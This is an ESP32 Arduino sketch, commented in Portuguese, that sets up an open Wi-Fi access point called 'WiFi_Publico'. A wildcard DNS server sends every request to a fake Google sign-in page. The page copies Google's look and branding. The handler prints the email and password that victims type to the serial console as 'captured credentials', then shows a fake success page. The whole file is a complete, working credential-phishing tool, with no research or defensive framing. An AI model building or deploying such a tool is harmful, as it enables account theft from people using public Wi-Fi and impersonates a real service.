#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

// Configurações do Access Point
const char* ssid = "WiFi_Publico";
const char* password = "";

// Página HTML do phishing
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login - Contas do Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        /* Estilos mantidos iguais ao original */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
        body { background-color: #ffffff; color: #202124; display: flex; flex-direction: column; min-height: 100vh; }
        header { padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #dadce0; }
        .logo { height: 24px; }
        .language-selector { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
        main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 24px; max-width: 450px; margin: 0 auto; width: 100%; }
        .login-container { width: 100%; display: block; }
        .success-container { width: 100%; display: none; text-align: center; padding: 40px 0; }
        .success-icon { width: 80px; height: 80px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 400; margin: 16px 0; text-align: center; }
        .subtitle { font-size: 16px; font-weight: 400; color: #202124; margin-bottom: 40px; text-align: center; }
        .input-container { position: relative; margin-bottom: 24px; }
        .email-input, .password-input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
        .email-input:focus, .password-input:focus { border: 1px solid #1a73e8; }
        .input-label { position: absolute; left: 15px; top: 13px; color: #5f6368; font-size: 16px; pointer-events: none; transition: all 0.2s; }
        .email-input:focus + .input-label, .email-input:not(:placeholder-shown) + .input-label,
        .password-input:focus + .input-label, .password-input:not(:placeholder-shown) + .input-label {
            top: -8px; left: 10px; font-size: 12px; background-color: #ffffff; padding: 0 5px; color: #1a73e8;
        }
        .forgot-email, .forgot-password { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; display: block; margin-bottom: 40px; }
        .info-text { font-size: 14px; color: #5f6368; margin-bottom: 40px; }
        .info-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .buttons { display: flex; justify-content: space-between; margin-top: 26px; }
        .create-account { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; padding: 10px 0; }
        .next-button, .login-button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-button:hover, .login-button:hover { background-color: #1b66c9; box-shadow: 0 1px 2px 0 rgba(66,64,67,.3), 0 1px 3px 1px rgba(66,64,67,.15); }
        .password-field { display: none; }
        footer { background-color: #f2f2f2; padding: 24px; font-size: 12px; color: #70757a; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 24px; margin-bottom: 8px; }
        .footer-links a { color: #70757a; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header>
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
        <a href="#" class="language-selector">Português (Brasil)</a>
    </header>
    
    <main>
        <div class="login-container" id="loginForm">
            <h1>Fazer login</h1>
            <p class="subtitle">Use sua Conta do Google</p>
            
            <form id="loginFormElement" method="POST" action="/login">
                <div class="input-container email-field">
                    <input type="email" name="email" class="email-input" placeholder=" " id="email" autocomplete="username" required>
                    <label for="email" class="input-label">E-mail ou telefone</label>
                </div>
                
                <div class="input-container password-field">
                    <input type="password" name="password" class="password-input" placeholder=" " id="password" autocomplete="current-password" required>
                    <label for="password" class="input-label">Digite sua senha</label>
                </div>
                
                <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
                <a href="#" class="forgot-password" style="display: none;">Esqueceu a senha?</a>
                
                <p class="info-text">
                    Não está no seu computador? Use o modo visitante para fazer login com privacidade. 
                    <a href="#">Saiba mais</a>
                </p>
                
                <div class="buttons">
                    <a href="#" class="create-account">Criar conta</a>
                    <button type="button" class="next-button" id="nextButton">Avançar</button>
                    <button type="submit" class="login-button" id="loginButton" style="display: none;">Fazer login</button>
                </div>
            </form>
        </div>
        
        <div class="success-container" id="successMessage">
            <svg class="success-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#34A853">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
            <h1>Conectado com sucesso!</h1>
            <p class="subtitle">Você agora está logado na sua conta Google</p>
        </div>
    </main>
    
    <footer>
        <div class="footer-links">
            <a href="#">Termos</a>
            <a href="#">Privacidade</a>
            <a href="#">Ajuda</a>
        </div>
        <div>Selecione o idioma</div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const emailField = document.querySelector('.email-field');
            const passwordField = document.querySelector('.password-field');
            const forgotEmail = document.querySelector('.forgot-email');
            const forgotPassword = document.querySelector('.forgot-password');
            const nextButton = document.getElementById('nextButton');
            const loginButton = document.getElementById('loginButton');
            const loginForm = document.getElementById('loginForm');
            const successMessage = document.getElementById('successMessage');
            const formElement = document.getElementById('loginFormElement');
            
            // Simula o fluxo de login do Google
            nextButton.addEventListener('click', function() {
                const email = document.getElementById('email').value;
                
                if (email) {
                    // Mostra campo de senha
                    passwordField.style.display = 'block';
                    forgotPassword.style.display = 'block';
                    forgotEmail.style.display = 'none';
                    nextButton.style.display = 'none';
                    loginButton.style.display = 'block';
                    
                    // Rola para o campo de senha
                    passwordField.scrollIntoView({ behavior: 'smooth' });
                    document.getElementById('password').focus();
                } else {
                    alert('Por favor, digite seu e-mail ou telefone');
                }
            });
            
            // Volta para o campo de e-mail se clicar em "Esqueceu a senha?"
            forgotPassword.addEventListener('click', function(e) {
                e.preventDefault();
                passwordField.style.display = 'none';
                forgotPassword.style.display = 'none';
                forgotEmail.style.display = 'block';
                nextButton.style.display = 'block';
                loginButton.style.display = 'none';
                document.getElementById('email').focus();
            });
            
            // Manipula o envio do formulário
            formElement.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(formElement);
                
                fetch('/login', {
                    method: 'POST',
                    body: new URLSearchParams(formData)
                })
                .then(response => {
                    if (response.ok) {
                        loginForm.style.display = 'none';
                        successMessage.style.display = 'block';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            });
        });
    </script>
</body>
</html>
)rawliteral";

void handleLogin() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }

  String email = server.arg("email");
  String password = server.arg("password");

  Serial.println("\n===== CREDENCIAIS CAPTURADAS =====");
  Serial.print("Email: "); Serial.println(email);
  Serial.print("Senha: "); Serial.println(password);
  Serial.println("================================");

  server.send(200, "text/html", "<script>window.location.href = '/success';</script>");
}

void handleRoot() {
  server.send(200, "text/html", loginPage);
}

void handleSuccess() {
  server.send(200, "text/html", 
    "<h1 style='text-align:center;margin-top:50px;'>Login realizado com sucesso!</h1>"
    "<p style='text-align:center;'>Você pode fechar esta página.</p>");
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\nIniciando Access Point...");
  WiFi.softAP(ssid, password);
  
  Serial.print("SSID: "); Serial.println(ssid);
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/success", handleSuccess);
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("Servidor HTTP iniciado!");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}